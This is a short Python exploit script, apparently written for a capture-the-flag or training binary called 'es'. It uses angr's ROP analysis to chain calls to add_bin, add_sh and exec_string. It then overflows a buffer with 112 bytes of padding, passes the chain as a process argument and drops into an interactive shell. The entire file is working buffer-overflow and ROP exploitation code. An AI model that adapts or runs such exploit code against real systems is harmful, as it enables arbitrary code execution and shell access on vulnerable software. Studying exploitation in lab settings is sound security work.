"""
Oro bestia
"""


import angr
import angrop
from pwn import *

file_path = 'es'

EXE_FILE = file_path
exe = ELF(EXE_FILE)

p = angr.Project(file_path)
rop = p.analyses.ROP()
rop.find_gadgets()

chain = rop.func_call("add_bin", [0xdeadbeef])
chain += rop.func_call("add_sh", [0xcafebabe, 0x0badf00d])
chain += rop.func_call("exec_string", [])

# chains can be printed for copy pasting into exploits
chain.print_payload_code()

# print("Catena generata:" + chain)
ropchain = b'A' * (108 + 4)
# print(chain.payload_str())
io = process([EXE_FILE, ropchain + chain.payload_str()])  # executing the executable with ropchain as input
#
io.interactive()  # to manually interact with the spawn shell
